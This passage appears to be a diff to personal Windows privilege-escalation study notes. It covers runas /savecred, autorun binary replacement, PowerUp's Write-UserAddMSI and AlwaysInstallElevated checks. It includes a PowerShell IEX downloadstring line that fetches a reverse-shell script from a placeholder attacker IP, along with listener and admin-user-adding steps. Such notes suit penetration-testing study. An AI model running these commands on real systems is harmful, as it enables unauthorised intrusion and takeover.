@@ -234,3 +234,29 @@ This command allows us to run commands as somebody else.
 We can use this command only if we have stored keys on cmdkey /list command.
 example runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://IP/FILENAME.ps1')" (the file will have a reverse shell/ other things that we want to abuse).
 ```
+# Autorun
+```
+Autorun is when we have a program that is set to autorun (we dont need any interaction to make it run e.x someone loging on will make the autorun program.exe to run).
+We can use a tool named ---> Autroruns64.exe to see what is autorunning.
+We can use a tool named accesschk64.exe with the flags -#w#(only show files with write)#v#(verbose)#u#(ignore errors) and the path to the file that we want to check the access (e.x Accesschk64.exe -wvu "c:\program files\autorun program".
+After we will run the tool we will look for an option named RW everyone and FILE_ALL_ACCESS that means that we can make someone else to run this file and get a revshell on the user that has run this program.exe.
+Lets say the we can RW on the path that the program.exe is on, we can create a malicious file that has a reverse shell to our session, and replace it with the existing file that is on there.
+We will make our own file and open a listener on nc/ meterpreter and we will wait until it will trigger the file.
+```
+# PowerUp
+```
+PowerUp is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes varios service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system.
+We will use the command PowerUp.ps1 power -ep bypass.
+Lets take an example that we have the option AlwaysInstallElevated and the abusefunction: write-useraddMSI.
+So we will do the command ---> Write-UserAddMSI (in the powerup path).
+It will install a melicious msi file that we could elevate to higher privileged.
+We will run the program that we've created that has admin priv and get a user added to administrator localgroup (in our case).
+```
+# AlwaysInstallElevated
+```
+We can use the AlwaysInstallElevated policy to install a Windows Installer package with elevated (system) privileges.
+This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.
+To see if we have premission to do so we can use the command ---> reg query HKLM\Software\Policies\Microsoft\Windows\Installer if it says 0x1 that means that we got the premissoin to do so.
+We also need to run ---> reg query HKCU\Software\Policies\Microsoft\Windows\Installer we need to have 0x1 on that too for us to have premission to install windows packages with elevated privileges.
+WE NEED BOTH TO HAVE 0x1 for that to work.
+```
